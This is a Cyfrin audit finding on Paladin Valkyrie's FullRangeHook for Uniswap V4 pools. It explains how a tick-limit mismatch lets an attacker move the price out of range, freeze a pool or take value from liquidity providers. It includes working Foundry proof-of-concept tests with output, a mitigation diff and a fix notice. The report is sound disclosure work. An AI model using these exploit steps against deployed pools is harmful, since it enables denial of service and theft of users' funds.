---
tags:
  - lang/solidity
  - sector/dex
  - sector/stable
  - platform/cyfrin
  - has/github
  - severity/high
protocol: "[[Paladin Valkyrie]]"
auditors:
  - Draiakoo
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-03-12-cyfrin-paladin-valkyrie-v2.0.md"
genome:
  - "[[oracle-manipulation-resistance]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[trigger/price-manipulation]]"
---
# Manipulation of price outside of the `FullRangeHook` liquidity range can result in DoS and financial loss to liquidity providers

- id: 61556
- impact: HIGH
- protocol: Paladin Valkyrie
- reporter: Draiakoo (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-03-12-cyfrin-paladin-valkyrie-v2.0.md

## Summary


The bug report is about a discrepancy in the minimum and maximum ticks used by the `FullRangeHook` in Uniswap V4 pools compared to those defined in the `TickMath` contract. This causes the liquidity computation to be significantly different when the price is within the expected tick range versus outside, which can lead to a denial of service (DoS) attack or loss of value to liquidity providers. A proof of concept test is provided, along with a demonstration of how an attacker could manipulate the price to cause a DoS or steal value from other liquidity providers. The bug has been fixed by the Paladin team and verified by Cyfrin.

## Details

**Description:** The minimum and maximum ticks used by the `FullRangeHook` differ from those defined in Uniswap V4 pools:

```solidity
FullRangeHook.sol:
 /// @dev Min tick for full range with tick spacing of 60
int24 internal constant MIN_TICK = -887220;
/// @dev Max tick for full range with tick spacing of 60
int24 internal constant MAX_TICK = -MIN_TICK;

TickMath.sol:
/// @dev The minimum tick that may be passed to #getSqrtPriceAtTick computed from log base 1.0001 of 2**-128
/// @dev If ever MIN_TICK and MAX_TICK are not centered around 0, the absTick logic in getSqrtPriceAtTick cannot be used
int24 internal constant MIN_TICK = -887272;
/// @dev The maximum tick that may be passed to #getSqrtPriceAtTick computed from log base 1.0001 of 2**128
/// @dev If ever MIN_TICK and MAX_TICK are not centered around 0, the absTick logic in getSqrtPriceAtTick cannot be used
int24 internal constant MAX_TICK = 887272;
```

This means that there are two regions into which the price can move to become outside the range of the liquidity. This is against the intended behavior that the price of a pool configured with the `FullRangeHook` will always be between the defined limits such that execution is expected to always occur inside the middle `else if` branch:

```solidity
function getLiquidityForAmounts(
    uint160 sqrtRatioX96,
    uint160 sqrtRatioAX96,
    uint160 sqrtRatioBX96,
    uint256 amount0,
    uint256 amount1
) internal pure returns (uint128 liquidity) {
    if (sqrtRatioAX96 > sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);

    if (sqrtRatioX96 <= sqrtRatioAX96) {
        liquidity = getLiquidityForAmount0(sqrtRatioAX96, sqrtRatioBX96, amount0);
    } else if (sqrtRatioX96 < sqrtRatioBX96) {
        uint128 liquidity0 = getLiquidityForAmount0(sqrtRatioX96, sqrtRatioBX96, amount0);
        uint128 liquidity1 = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioX96, amount1);

        liquidity = liquidity0 < liquidity1 ? liquidity0 : liquidity1;
    } else {
        liquidity = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioBX96, amount1);
    }
}
```

However, if the price moves outside of this tick range, this is not the case. The liquidity computation will be significantly different from what is expected and can lead to a DoS of the pool or a loss of value to liquidity providers.

**Proof of Concept:** The following test that should be placed within `FullRangeHook.t.sol` first analyzes the extreme difference in liquidity computation:

```solidity
function test_LiquidityManipulation() public {
    uint160 sqrtMaxTickUniswap = TickMath.getSqrtPriceAtTick(887272);

    uint256 liquidity = LiquidityAmounts.getLiquidityForAmounts(
        SQRT_PRICE_1_1,
        TickMath.getSqrtPriceAtTick(MIN_TICK),
        TickMath.getSqrtPriceAtTick(MAX_TICK),
        100 * 10 ** 18,
        100 * 10 ** 18
    );

    uint256 manipulatedLiquidity = LiquidityAmounts.getLiquidityForAmounts(
        sqrtMaxTickUniswap,
        TickMath.getSqrtPriceAtTick(MIN_TICK),
        TickMath.getSqrtPriceAtTick(MAX_TICK),
        100 * 10 ** 18,
        100 * 10 ** 18
    );

    console.log(liquidity);
    console.log(manipulatedLiquidity);
}
```

Output:
```bash
Ran 1 test for test/FullRangeHook.t.sol:TestFullRangeHook
[PASS] test_LiquidityManipulation() (gas: 11805)
Logs:
  100000000000000000005
  5
```

As can be seen in the output above, given the same amount of tokens (`100e18`) the computed liquidity differs significantly when the price is within the expected tick range versus outside. In the first case, the liquidity is computed as `100e18` which is related to the amount of deposited tokens, whereas the latter case computes a liquidity amount of only `5` while still consuming the same amount of tokens.

This discrepancy can be leveraged by an attacker to create a DoS in the pool by moving the price of the pool to a tick outside the intended liquidity range immediately after initialization. This can be easily achieved by executing a swap against the pool in the desired direction while there is still no liquidity. Once the price is outside the range, the validation performed to ensure that the first depositor has minted the minimum liquidity would fail since the computed liquidity value would be so small. As such, this would force a huge deposit amount to pass the validation which would represent a loss of funds to the depositor.

```solidity
uint256 liquidityMinted;
if (poolLiquidity == 0) {
    // permanently lock the first MINIMUM_LIQUIDITY tokens
    liquidityMinted = liquidity - MINIMUM_LIQUIDITY;
    poolLiquidityToken.mint(address(0), MINIMUM_LIQUIDITY);
    // Mint the LP tokens to the user
    poolLiquidityToken.mint(params.to, liquidityMinted);
} else {
    ...
}
```

In concrete terms, more than `18000e18` tokens would be needed for an 18-decimal token to reach the minimum liquidity requirement of `1e3`:

```solidity
function test_LiquidityManipulation() public {
    uint160 sqrtMaxTickUniswap = TickMath.getSqrtPriceAtTick(887272);

    uint256 manipulatedLiquidity = LiquidityAmounts.getLiquidityForAmounts(
        sqrtMaxTickUniswap,
        TickMath.getSqrtPriceAtTick(MIN_TICK),
        TickMath.getSqrtPriceAtTick(MAX_TICK),
        18000 * 10 ** 18,
        18000 * 10 ** 18
    );

    console.log(manipulatedLiquidity);
}
```

Output:
```bash
Ran 1 test for test/FullRangeHook.t.sol:TestFullRangeHook
[PASS] test_LiquidityManipulation() (gas: 11805)
Logs:
  978
```

For tokens with fewer than 18 decimals, such as USDC which has 6, it would not be possible to satisfy this minimum liquidity requirement and the pool would be permanently frozen.

The following test, which should be placed within`FullRangeHook.t.sol`, provides a demonstration of how an attacker could move the price outside of the intended range after initialization of the pool but while it still has no liquidity:

```solidity
function test_DoSMaximumTick() public {
    uint160 sqrtMaxTickUniswap = TickMath.getSqrtPriceAtTick(887271);

    manager.initialize(key, SQRT_PRICE_1_1);

    IPoolManager.SwapParams memory params;
    HookEnabledSwapRouter.TestSettings memory settings;

    params =
        IPoolManager.SwapParams({ zeroForOne: false, amountSpecified: type(int256).min, sqrtPriceLimitX96: sqrtMaxTickUniswap });
    settings =
        HookEnabledSwapRouter.TestSettings({ takeClaims: false, settleUsingBurn: false });

    router.swap(key, params, settings, ZERO_BYTES);

    (uint160 poolPrice,,,) = manager.getSlot0(key.toId());
    assertEq(poolPrice, sqrtMaxTickUniswap);
}
```

Note that it is required to comment out the following line of code within `HookEnabledSwapRouter` for the test to run:

```solidity
function unlockCallback(bytes calldata rawData) external returns (bytes memory) {
    ...
    // Make sure youve added liquidity to the test pool!
    // @audit disabled this for testing purposes
    // if (BalanceDelta.unwrap(delta) == 0) revert NoSwapOccurred();
    ...
}
```
This is simply a helper function designed to execute swaps in the tests while preventing those of 0 delta.

Note that despite the above test, it is also possible to move the price outside of the liquidity range even when there is liquidity in the pool. The attack is more costly but has greater impact, since it will not only affect the liquidity computation for subsequent additions as demonstrated above but also will DoS the addition of liquidity because the `_rebalance()` function will revert:

```solidity
function _rebalance(PoolKey memory key) public {
    PoolId poolId = key.toId();
    // Remove all the liquidity from the Pool
    (BalanceDelta balanceDelta,) = poolManager.modifyLiquidity(
        key,
        IPoolManager.ModifyLiquidityParams({
            tickLower: MIN_TICK,
            tickUpper: MAX_TICK,
            liquidityDelta: -(poolManager.getLiquidity(poolId).toInt256()),
            salt: 0
        }),
        ZERO_BYTES
    );

    // Calculate the new sqrtPriceX96
    uint160 newSqrtPriceX96 = (
        FixedPointMathLib.sqrt(
            FullMath.mulDiv(uint128(balanceDelta.amount1()), FixedPoint96.Q96, uint128(balanceDelta.amount0()))
        ) * FixedPointMathLib.sqrt(FixedPoint96.Q96)
    ).toUint160();
    ...
}
```

It first removes all the liquidity and then computes the new square root price; however, if the price has been manipulated to lay outside the intended liquidity range, this removal will be single-sided in only one of the pool tokens. This will therefore cause a panic revert when attempting to compute the new square root price due to division by a zero amount of `token0`:

```solidity
function test_RebalanceWhenPriceIsOutsideTickRange() public {
    manager.initialize(key, SQRT_PRICE_1_1);
    uint160 sqrtMaxTickUniswap = TickMath.getSqrtPriceAtTick(887271);
    uint160 sqrtMinTickUniswap = TickMath.getSqrtPriceAtTick(-887271);

    uint256 prevBalance0 = key.currency0.balanceOf(address(this));
    uint256 prevBalance1 = key.currency1.balanceOf(address(this));
    (, address liquidityToken) = fullRange.poolInfo(id);

    fullRange.addLiquidity(
        FullRangeHook.AddLiquidityParams(
            key.currency0, key.currency1, 3000, 10e6, 10e6, 0, 0, address(this), MAX_DEADLINE
        )
    );

    uint256 prevLiquidityTokenBal = IncentivizedERC20(liquidityToken).balanceOf(address(this));

    IPoolManager.SwapParams memory params =
        IPoolManager.SwapParams({ zeroForOne: false, amountSpecified: -int256(key.currency0.balanceOfSelf()), sqrtPriceLimitX96: sqrtMaxTickUniswap });
    HookEnabledSwapRouter.TestSettings memory settings =
        HookEnabledSwapRouter.TestSettings({ takeClaims: false, settleUsingBurn: false });

    router.swap(key, params, settings, ZERO_BYTES);

    vm.expectRevert();
    fullRange.addLiquidity(
        FullRangeHook.AddLiquidityParams(
            key.currency0, key.currency1, 3000, 100000 ether, 100000 ether, 0, 0, address(this), MAX_DEADLINE
        )
    );
}
```

In the scenario where a pool is initialized outside of the intended range, manipulation of the liquidity calculations can be achieved without resulting in a DoS, meaning attackers can steal value from other liquidity providers:

```solidity
function test_addLiquidityFullRangePoC() public {
    token1 = new MockERC20("token1", "T1", 6);
    (token0, token1) = token0 > token1 ? (token1, token0) : (token0, token1);

    PoolKey memory newKey = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), 3000, 60, IHooks(hookAddress2));
    // the pool is initialized out of the intended range, either accidentally or by an attacker front-running bob
    manager.initialize(newKey, TickMath.getSqrtPriceAtTick(MIN_TICK - 1));

    uint256 mintAmount0 = 10_000_000 * 10 ** token0.decimals();
    uint256 mintAmount1 = 10_000_000 * 10 ** token1.decimals();

    address alice = makeAddr("alice");
    token0.mint(alice, mintAmount0);
    token1.mint(alice, mintAmount1);
    vm.startPrank(alice);
    token0.approve(hookAddress2, type(uint256).max);
    token1.approve(hookAddress2, type(uint256).max);
    vm.stopPrank();

    address bob = makeAddr("bob");
    token0.mint(bob, mintAmount0);
    token1.mint(bob, mintAmount1);
    vm.startPrank(bob);
    token0.approve(hookAddress2, type(uint256).max);
    token1.approve(hookAddress2, type(uint256).max);
    token0.approve(address(router), type(uint256).max);
    token1.approve(address(router), type(uint256).max);
    vm.stopPrank();

    uint160 minSqrtPrice = TickMath.getSqrtPriceAtTick(MIN_TICK);
    uint160 maxSqrtPrice = TickMath.getSqrtPriceAtTick(MAX_TICK);

    // bob adds liquidity while the price is outside the intended range
    uint256 amount0Bob = 1_000_000 * 10 ** token0.decimals();
    uint256 amount1Bob = 1_000_000 * 10 ** token1.decimals();

    FullRangeHook.AddLiquidityParams memory addLiquidityParamsBob = FullRangeHook.AddLiquidityParams(
        newKey.currency0, newKey.currency1, 3000, amount0Bob, amount1Bob, 0, 0, bob, MAX_DEADLINE
    );

    console.log("bob adding liquidity");
    uint256 amount0BobBefore = token0.balanceOf(bob);
    uint256 amount1BobBefore = token1.balanceOf(bob);
    vm.prank(bob);
    uint128 addedLiquidityBob = fullRange2.addLiquidity(addLiquidityParamsBob);
    console.log("added liquidity bob: %s ", uint256(addedLiquidityBob));
    console.log("token0 diff bob add liquidity: %s", amount0BobBefore - token0.balanceOf(bob));
    console.log("token1 diff bob add liquidity: %s", amount1BobBefore - token1.balanceOf(bob));

    (, address liquidityToken) = fullRange2.poolInfo(newKey.toId());
    uint256 liquidityTokenBalBob = IncentivizedERC20(liquidityToken).balanceOf(bob);
    console.log("liquidityTokenBal bob: %s", liquidityTokenBalBob);

    // alice moves price back into range
    IPoolManager.SwapParams memory params =
        IPoolManager.SwapParams({ zeroForOne: false, amountSpecified: -int256(uint256(1_000 * 10 ** token1.decimals())), sqrtPriceLimitX96: maxSqrtPrice });
    HookEnabledSwapRouter.TestSettings memory settings =
        HookEnabledSwapRouter.TestSettings({ takeClaims: false, settleUsingBurn: false });

    vm.prank(alice);
    router.swap(newKey, params, settings, ZERO_BYTES);

    // alice adds liquidity
    uint256 amount0Alice = 1_000_000 * 10 ** token0.decimals();
    uint256 amount1Alice = 1_000_000 * 10 ** token1.decimals();

    FullRangeHook.AddLiquidityParams memory addLiquidityParamsAlice = FullRangeHook.AddLiquidityParams(
        newKey.currency0, newKey.currency1, 3000, amount0Alice, amount1Alice, 0, 0, alice, MAX_DEADLINE
    );
    console.log("alice adding liquidity");
    uint256 amount0AliceBefore = token0.balanceOf(alice);
    uint256 amount1AliceBefore = token1.balanceOf(alice);
    (uint160 sqrtPriceX96,,,) = manager.getSlot0(newKey.toId());
    assertTrue(sqrtPriceX96 > minSqrtPrice && sqrtPriceX96 < maxSqrtPrice);
    uint128 liquidity = LiquidityAmounts.getLiquidityForAmounts(
        sqrtPriceX96,
        TickMath.getSqrtPriceAtTick(MIN_TICK),
        TickMath.getSqrtPriceAtTick(MAX_TICK),
        amount0Alice,
        amount1Alice
    );
    console.log("calculated liquidity: %s", uint256(liquidity));

    vm.prank(alice);
    uint128 addedLiquidityAlice = fullRange2.addLiquidity(addLiquidityParamsAlice);
    console.log("added liquidity alice: %s ", uint256(addedLiquidityAlice));

    uint256 liquidityTokenBalAlice = IncentivizedERC20(liquidityToken).balanceOf(alice);
    console.log("liquidityTokenBal alice: %s", liquidityTokenBalAlice);
    console.log("token0 diff alice add liquidity: %s", amount0AliceBefore - token0.balanceOf(alice));
    console.log("token1 diff alice add liquidity: %s", amount1AliceBefore - token1.balanceOf(alice));
}
```

Output:
```bash
Ran 1 test for test/FullRangeHook.t.sol:TestFullRangeHook
[PASS] test_addLiquidityFullRangePoC() (gas: 3292884)
Logs:
  bob adding liquidity
  added liquidity bob: 54353
  token0 diff bob add liquidity: 999994954645167564999855
  token1 diff bob add liquidity: 0
  liquidityTokenBal bob: 53353
  alice adding liquidity
  calculated liquidity: 54516555
  added liquidity alice: 54516555
  liquidityTokenBal alice: 66258319
  token0 diff alice add liquidity: 2439
  token1 diff alice add liquidity: 1219027186039
```
As can be seen above, Alice receives significantly more liquidity tokens for far fewer underlying pool tokens.

**Impact:** Pools configured with the `FullRangeHook` can be disabled by manipulation of the price to be outside the intended range. This can also result in financial loss for liquidity providers.

**Recommended Mitigation:** Prevent the price from being moved outside of the intended tick range when swapping with the `FullRangeHook`:

```diff
    function afterSwap(address, PoolKey calldata key, IPoolManager.SwapParams calldata, BalanceDelta, bytes calldata)
        external
        override
        onlyPoolManager
        returns (bytes4, int128)
    {
        PoolId poolId = key.toId();

++      (uint160 sqrtPriceX96,,,) = poolManager.getSlot0(poolId);
++      require(sqrtPriceX96 > TickMath.getSqrtPriceAtTick(MIN_TICK) && sqrtPriceX96 < TickMath.getSqrtPriceAtTick(MAX_TICK), "Outside tick range");

        if (address(incentiveManager) != address(0)) {
            incentiveManager.notifySwap(poolId, poolInfo[poolId].liquidityToken);
        }

        return (FullRangeHook.afterSwap.selector, 0);
    }
```

While constraining the price movement in this way works well for the `FullRangeHook`, given that this is the intended behavior and all liquidity providers will be subject to the same liquidity computation with the same decimal precision, the nature of `MultiRangeHook` makes mitigation more challenging. In this case, it is the intended behavior that the price can move in and out of the different price ranges. The existing slippage validation should provide sufficient protection, so long as it is correctly configured by the sender, since malicious front-running of liquidity addition that causes the square root price to cross one of the tick limits will result in single sided liquidity being provided. Thus, the expectation of providing liquidity in both tokens will not hold and a non-zero minimum amount parameter will not pass the validation.

**Paladin:** Fixed by commit [`abbb673`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/abbb673014b77f46119eb24a62f4d0fef2c9ff1d).

**Cyfrin:** Verified. `FullRangeHook::afterSwap` now prevents the square root price from exiting the intended tick range.
